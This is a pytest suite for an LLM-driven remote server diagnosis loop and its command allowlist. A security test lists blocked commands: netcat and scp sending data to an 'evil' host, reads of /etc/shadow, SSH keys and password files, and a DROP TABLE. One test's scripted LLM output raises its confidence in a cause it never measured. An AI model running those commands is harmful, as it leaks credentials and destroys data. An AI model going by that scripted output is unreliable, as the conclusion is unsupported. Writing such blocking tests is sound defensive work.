"""Tests for diagnosis_loop tool dispatch quality + offline handling.

Covers the fixes for: agent-offline degraded path, command dedup, timeout
result labeling in followup context, and emitter rendering of those states.
"""
from __future__ import annotations

import json
import time

import pytest

from services.analyst import diagnosis_loop as dl
from workers import remote_diagnosis_emitter as em


def _redis():
    from fakeredis.aioredis import FakeRedis

    return FakeRedis(decode_responses=True)


class _FakeResp:
    def __init__(self, content: str):
        self.message = type("M", (), {"content": content})()


class _FakeLLM:
    """Returns queued JSON strings, one per chat() call."""

    def __init__(self, responses: list[dict]):
        self._responses = [json.dumps(r) for r in responses]
        self.calls: list[list[dict]] = []

    async def chat(self, *, model, messages, format=None, options=None):
        self.calls.append(list(messages))
        idx = min(len(self.calls) - 1, len(self._responses) - 1)
        return _FakeResp(self._responses[idx])


async def _register_agent(redis, agent_id, age_s=0):
    await redis.set(
        f"{dl._REGISTRY_KEY_PREFIX}{agent_id}",
        json.dumps({"agent_id": agent_id, "last_seen": int(time.time()) - age_s}),
    )


# ── _agent_is_online ────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_agent_online_true_when_fresh():
    redis = _redis()
    await _register_agent(redis, "uat-proxysql", age_s=10)
    assert await dl._agent_is_online(redis, "uat-proxysql") is True


@pytest.mark.asyncio
async def test_agent_online_false_when_stale():
    redis = _redis()
    await _register_agent(redis, "uat-proxysql", age_s=dl._AGENT_ONLINE_MAX_AGE_S + 50)
    assert await dl._agent_is_online(redis, "uat-proxysql") is False


@pytest.mark.asyncio
async def test_agent_online_false_when_unregistered():
    redis = _redis()
    assert await dl._agent_is_online(redis, "zabbix-uat") is False


# ── offline degraded path: no enqueue, degraded flag, >= MIN_TURNS ───────────

@pytest.mark.asyncio
async def test_offline_agent_runs_facts_only_degraded():
    redis = _redis()  # no registry → offline
    # LLM keeps asking for commands; loop must NOT dispatch and must finalize.
    llm = _FakeLLM([
        {"reasoning": "r1", "hypothesis": "disk full", "commands_to_run":
            [{"command": "du", "args": ["-sh", "/var"], "purpose": "p"}],
         "diagnosis_complete": False, "confidence": 0.5},
        {"reasoning": "r2", "hypothesis": "disk full", "commands_to_run": [],
         "diagnosis_complete": True, "confidence": 0.7,
         "root_cause": "Disk /var full", "affected_components": ["/var"],
         "remediation_steps": ["clean logs"]},
    ])
    ev_doc = {"probe": "disk_usage", "lane": "SYS_HARD_FAIL",
              "alert_hint": "no space", "extracted_fact": {"disk_used_pct": 99}}

    session = await dl.run_diagnosis_loop(
        redis=redis, llm_client=llm, agent_id="zabbix-uat",
        ev_doc=ev_doc, trace_id="t-offline",
    )

    assert session["degraded"] is True
    assert "agent_offline" in session["degraded_reason"]
    assert session["total_turns"] >= dl._MIN_TURNS
    # No command should have reached the queue.
    assert await redis.llen(f"{dl._CMD_QUEUE_PREFIX}zabbix-uat") == 0
    for turn in session["turns"]:
        assert turn["command_results"] == []


# ── online dedup: same command not enqueued twice ────────────────────────────

@pytest.mark.asyncio
async def test_online_dedup_skips_repeated_command(monkeypatch):
    redis = _redis()
    await _register_agent(redis, "uat-proxysql", age_s=5)

    # Both turns request the IDENTICAL command; turn-2 must be deduped.
    llm = _FakeLLM([
        {"reasoning": "r1", "hypothesis": "h", "commands_to_run":
            [{"command": "df", "args": ["-h", "/var"], "purpose": "p"}],
         "diagnosis_complete": False, "confidence": 0.4},
        {"reasoning": "r2", "hypothesis": "h", "commands_to_run":
            [{"command": "df", "args": ["-h", "/var"], "purpose": "p"}],
         "diagnosis_complete": True, "confidence": 0.8,
         "root_cause": "rc", "remediation_steps": ["x"]},
    ])

    enqueued: list[dict] = []
    orig = dl._enqueue_commands

    async def _spy(redis_, agent_id, commands, trace_id):
        enqueued.append({"agent_id": agent_id, "commands": list(commands)})
        return await orig(redis_, agent_id, commands, trace_id)

    monkeypatch.setattr(dl, "_enqueue_commands", _spy)

    # Don't actually wait 90s for results — return instantly.
    async def _fast_results(redis_, cmd_ids, timeout_s=0):
        return [{"cmd_id": c, "rc": 0, "stdout": "ok", "blocked": False} for c in cmd_ids]

    monkeypatch.setattr(dl, "_wait_for_results", _fast_results)

    ev_doc = {"probe": "disk_usage", "lane": "SYS_HARD_FAIL", "alert_hint": "x",
              "extracted_fact": {}}
    await dl.run_diagnosis_loop(
        redis=redis, llm_client=llm, agent_id="uat-proxysql",
        ev_doc=ev_doc, trace_id="t-dedup",
    )

    # Turn 1 enqueues df; turn 2's identical df is filtered → only ONE enqueue.
    assert len(enqueued) == 1


# ── followup context surfaces timeout instead of bare rc=1 ───────────────────

def test_followup_context_labels_timeout():
    results = [{
        "cmd_id": "cmd-1", "purpose": "check /var", "status": "timeout",
        "stdout": "", "stderr": "TIMEOUT: agent did not poll", "rc": 124,
    }]
    text = dl._build_followup_context(results, next_turn=2)
    assert "agent_unreachable" in text
    assert "did NOT execute" in text


def test_followup_context_surfaces_stderr_on_real_failure():
    results = [{
        "cmd_id": "cmd-2", "purpose": "p", "stdout": "", "stderr": "du: cannot access",
        "rc": 1,
    }]
    text = dl._build_followup_context(results, next_turn=2)
    assert "du: cannot access" in text


# ── emitter rendering ────────────────────────────────────────────────────────

def test_emitter_renders_timeout_marker():
    session = {
        "trace_id": "t1", "agent_id": "zabbix-uat", "probe": "disk_usage",
        "lane": "SYS_HARD_FAIL", "alert_hint": "no space", "degraded": True,
        "final": {"root_cause": "rc", "confidence": 0.7, "affected_components": [],
                  "remediation_steps": ["x"]},
        "turns": [{"turn": 1, "hypothesis": "h", "command_results": [
            {"cmd_id": "c", "status": "timeout", "rc": 124, "stdout": "",
             "stderr": "TIMEOUT", "purpose": "check"}]}],
    }
    msg = em.render_diagnosis_session(session)
    assert "agent offline — lệnh chưa chạy" in msg
    assert "DEGRADED" in msg
    # never leak a misleading rc=124
    assert "rc=124" not in msg


def test_format_command_joins_name_and_args():
    cmd = {"command": "ls", "args": ["-lS", "/var/log"], "purpose": "p"}
    assert dl._format_command(cmd) == "ls -lS /var/log"


def test_emitter_shows_actual_command_run():
    """The card MUST surface the verbatim command, not only the free-text purpose."""
    session = {
        "trace_id": "t2", "agent_id": "loyalty-uat", "probe": "disk_usage",
        "lane": "SYS_HARD_FAIL", "alert_hint": "/var elevated",
        "final": {"root_cause": "rc", "confidence": 0.9, "affected_components": [],
                  "remediation_steps": ["sudo truncate -s 0 /var/log/x.log"]},
        "turns": [{"turn": 1, "hypothesis": "h", "command_results": [
            {"cmd_id": "c", "rc": 0, "command_str": "ls -lS /var/log",
             "purpose": "list largest files",
             "stdout": "total 6644\n-rw-r----- 1 root 4.2G hostd.log"}]}],
    }
    msg = em.render_diagnosis_session(session)
    # 1. what it did — the real command
    assert "ls -lS /var/log" in msg
    # 2. what it found — top offender visible
    assert "4.2G hostd.log" in msg
    # 3. command to run — concrete remediation
    assert "sudo truncate -s 0 /var/log/x.log" in msg


# ── security: INV_NO_DATA_EXFIL ──────────────────────────────────────────────

@pytest.mark.parametrize("cmd,args", [
    # Ngoài catalogue hoàn toàn.
    ("strings", ["/var/lib/secret.db"]),
    ("nc", ["evil", "443"]),
    ("scp", ["/etc/hosts", "evil:/tmp"]),
    # Trong catalogue, nhưng ngoài PHẠM VI đọc (INV_DIAG_SCOPE_BOUNDED).
    ("cat", ["/var/lib/mysql/users.ibd"]),
    ("cat", ["/home/khach/.ssh/id_rsa"]),
    ("cat", ["/etc/shadow"]),
    ("tail", ["-n", "100", "/root/.bash_history"]),
    ("grep", ["password", "/home/app/.env"]),
    # Trong catalogue, nhưng động từ SQL không phải chẩn đoán.
    ("mysql", ["-e", "SELECT * FROM users"]),
    ("mysql", ["-e", "DROP TABLE t"]),
])
def test_data_exfil_and_out_of_scope_blocked(cmd, args):
    """INV_DIAG_SCOPE_BOUNDED thay INV_NO_DATA_EXFIL: chặn theo PHẠM VI ĐỌC, không
    theo tên lệnh. Chặn theo tên lệnh khiến Omni không đọc được log ứng dụng —
    tức không chẩn đoán được tầng app."""
    from remote_agent.command_executor import _is_command_allowed
    allowed, reason = _is_command_allowed(cmd, args)
    assert not allowed, f"{cmd} {args} phai bi chan"
    assert reason


@pytest.mark.parametrize("cmd,args", [
    ("ls", ["-lS", "/var/log"]),
    ("du", ["-sh", "/var/log"]),
    ("df", ["-h", "/var"]),
    ("systemctl", ["status", "mysql"]),
    ("journalctl", ["--disk-usage"]),
    ("free", ["-h"]),
    # Đọc nội dung TRONG phạm vi vận hành — điều kiện để chẩn đoán tầng app.
    ("cat", ["/proc/meminfo"]),
    ("tail", ["-n", "100", "/var/log/nginx/error.log"]),
    ("mysql", ["-e", "SHOW SLAVE STATUS"]),
])
def test_metadata_and_in_scope_reads_allowed(cmd, args):
    from remote_agent.command_executor import _is_command_allowed
    allowed, reason = _is_command_allowed(cmd, args)
    assert allowed, reason


def test_find_exec_blocked():
    from remote_agent.command_executor import _is_command_allowed
    allowed, reason = _is_command_allowed("find", ["/var/tmp", "-mtime", "+7", "-delete"])
    assert not allowed
    assert "find_dangerous_flag_blocked" in reason


# ── system-thinking: blast_radius rendered ───────────────────────────────────

def test_emitter_renders_blast_radius():
    session = {
        "trace_id": "t3", "agent_id": "uat-proxysql", "probe": "disk_usage",
        "lane": "SYS_HARD_FAIL", "alert_hint": "disk",
        "final": {"root_cause": "rc", "confidence": 0.8, "affected_components": ["/var"],
                  "blast_radius": "proxysql + 2 downstream APIs lose query routing if /var fills",
                  "remediation_steps": ["x"]},
        "turns": [{"turn": 1, "hypothesis": "h", "command_results": []}],
    }
    msg = em.render_diagnosis_session(session)
    assert "Lan toả hệ thống" in msg
    assert "downstream APIs" in msg


def test_preview_shows_head_and_tail_regardless_of_sort():
    """ls -lrS (smallest first) still surfaces the biggest file (last line)."""
    stdout = "total 100\n" + "\n".join(f"-rw- {i}K file{i}.log" for i in range(1, 11)) + "\n-rw- 9999M huge.log"
    preview = em._preview_output(stdout)
    assert "huge.log" in preview  # tail preserved
    assert "total 100" in preview  # head preserved
    assert "dòng) …" in preview


# ── INV_DIAG_MEASURED end-to-end (2026-08-02) ────────────────────────────────
#
# Ca thật `omni:diag:session:ra-689e6dc59ea4`: alert CPU, LLM xin `df -h` (đĩa),
# thấy đĩa ổn rồi kết luận về BỘ NHỚ mà không đo bộ nhớ lần nào — confidence còn
# TĂNG 0.75 → 0.95. Test này chạy qua CHÍNH `run_diagnosis_loop`, không phải chỉ
# hàm gate, để cổng không bị bỏ quên ở call site (bài học
# project_positional_pairing_bug_class: test hàm xanh mà bug vẫn còn).


@pytest.mark.asyncio
async def test_df_then_memory_conclusion_is_neutralized_end_to_end():
    import asyncio

    redis = _redis()
    await _register_agent(redis, "staging-sim_cust-app")

    llm = _FakeLLM([
        {"reasoning": "CPU 98.3%, load 11.37", "hypothesis":
            "CPU saturation on host cust-app due to high load average",
         "evidence_gaps": ["No information about disk usage or memory pressure"],
         "commands_to_run": [{"command": "df", "args": ["-h"], "purpose": "check disk"}],
         "diagnosis_complete": False, "confidence": 0.75},
        {"reasoning": "disk is only 18% used, so it must be memory",
         "hypothesis": "Insufficient memory available on the host",
         "evidence_gaps": [], "commands_to_run": [],
         "diagnosis_complete": True, "confidence": 0.95,
         "root_cause": "Insufficient memory available on the host",
         "affected_components": ["payment-api"],
         "remediation_steps": ["Increase the amount of RAM allocated to the VM"],
         "suggested_recovery": {"capability": "systemd.restart_unit", "unit": "payment-api.service"}},
    ])
    ev_doc = {"probe": "remote_system_metrics", "lane": "SYS_RESOURCE",
              "alert_hint": "[cust-app] CPU 98.3%>80.0%",
              "extracted_fact": {"cpu_percent": 98.3, "mem_percent": 60.0}}

    # Trả kết quả `df` ngay khi lệnh vào hàng đợi, để loop đi tiếp mà không chờ.
    async def _answer_df():
        for _ in range(200):
            keys = await redis.keys(f"{dl._CMD_QUEUE_PREFIX}staging-sim_cust-app")
            if keys:
                raw = await redis.rpop(f"{dl._CMD_QUEUE_PREFIX}staging-sim_cust-app")
                if raw:
                    cmd = json.loads(raw)
                    await redis.set(
                        f"{dl._CMD_RESULT_PREFIX}{cmd['cmd_id']}",
                        json.dumps({
                            "cmd_id": cmd["cmd_id"], "blocked": False,
                            "stdout": "Filesystem Size Used Avail Use% Mounted on\n"
                                      "/dev/vdb1 178G 32G 146G 18% /\n",
                            "stderr": "", "rc": 0, "exit_code": 0, "duration_ms": 7,
                        }),
                    )
                    return
            await asyncio.sleep(0.01)

    answerer = asyncio.create_task(_answer_df())
    session = await dl.run_diagnosis_loop(
        redis=redis, llm_client=llm, agent_id="staging-sim_cust-app",
        ev_doc=ev_doc, trace_id="t-mem-pivot",
    )
    answerer.cancel()

    final = session["final"]
    # Đại lượng "memory" không alert nào nêu, không lệnh nào đo.
    assert final["unmeasured_quantities"] == ["memory"]
    assert final["root_cause"].startswith("[UNMEASURED: memory]")
    # Không được lên thẻ như sự thật: độ tin bị hạ, auto-recovery bị gỡ.
    assert final["confidence"] <= 0.3
    assert final["suggested_recovery"] is None
    # Và ghi lại chính cú tăng độ tin vô căn cứ.
    assert final["confidence_inflation"]["from_confidence"] == pytest.approx(0.75)
    assert final["confidence_inflation"]["to_confidence"] == pytest.approx(0.95)


@pytest.mark.asyncio
async def test_packed_llm_args_are_normalized_before_enqueue():
    """`ps` với ["aux --sort=-%cpu"] phải vào hàng đợi ở dạng tách token."""
    redis = _redis()
    ids = await dl._enqueue_commands(
        redis, "cust-app",
        [{"command": "ps", "args": ["aux --sort=-%cpu"], "purpose": "top cpu"},
         {"command": "top", "args": [], "purpose": "live view"}],
        "t-norm",
    )
    assert len(ids) == 2
    queued = [json.loads(x) for x in await redis.lrange(f"{dl._CMD_QUEUE_PREFIX}cust-app", 0, -1)]
    by_cmd = {q["command"]: q["args"] for q in queued}
    assert by_cmd["ps"] == ["aux", "--sort=-%cpu"]
    assert "-b" in by_cmd["top"] and "-n" in by_cmd["top"]


# ── Trace binding trong background task (2026-08-02) ─────────────────────────
#
# Instrument LLM đo được 63/67 lệnh gọi ghi `trace=-`. Chỗ mất là nhánh
# remote_agent_pipeline: vòng chẩn đoán chạy trong asyncio task riêng. Test bám
# vào CALL SITE (không phải bản thân `inbound_trace_scope`) — test hàm sẽ xanh
# mà trace vẫn rơi (project_positional_pairing_bug_class).


@pytest.mark.asyncio
async def test_diagnosis_background_task_binds_trace_id():
    from types import SimpleNamespace
    from unittest.mock import AsyncMock, patch

    from workers import remote_agent_pipeline as rap
    from workers.request_trace import current_trace_id

    seen: list[str] = []

    async def _fake_inner(**kwargs):
        seen.append(current_trace_id())

    ctx = SimpleNamespace(redis=_redis(), settings=SimpleNamespace(), kafka=None)
    with patch.object(rap, "_run_diagnosis_and_notify_inner", new=AsyncMock(side_effect=_fake_inner)):
        await rap._run_diagnosis_and_notify(
            ctx=ctx, ev_doc={}, agent_id="a", trace="ra-deadbeef1234",
            llm=object(), model="m", num_ctx=8192, chat_id=1,
        )

    assert seen == ["ra-deadbeef1234"]


@pytest.mark.asyncio
async def test_trace_id_survives_into_a_spawned_task():
    """Bind phải sống qua ranh giới task — đó chính là chỗ nó từng rơi."""
    import asyncio

    from workers import remote_agent_pipeline as rap
    from workers.request_trace import current_trace_id

    seen: list[str] = []

    async def _probe():
        await asyncio.sleep(0)
        seen.append(current_trace_id())

    async def _fake_inner(**kwargs):
        await asyncio.create_task(_probe())

    from types import SimpleNamespace
    from unittest.mock import AsyncMock, patch

    ctx = SimpleNamespace(redis=_redis(), settings=SimpleNamespace(), kafka=None)
    with patch.object(rap, "_run_diagnosis_and_notify_inner", new=AsyncMock(side_effect=_fake_inner)):
        await rap._run_diagnosis_and_notify(
            ctx=ctx, ev_doc={}, agent_id="a", trace="ra-cafebabe9999",
            llm=object(), model="m", num_ctx=8192, chat_id=1,
        )

    assert seen == ["ra-cafebabe9999"]
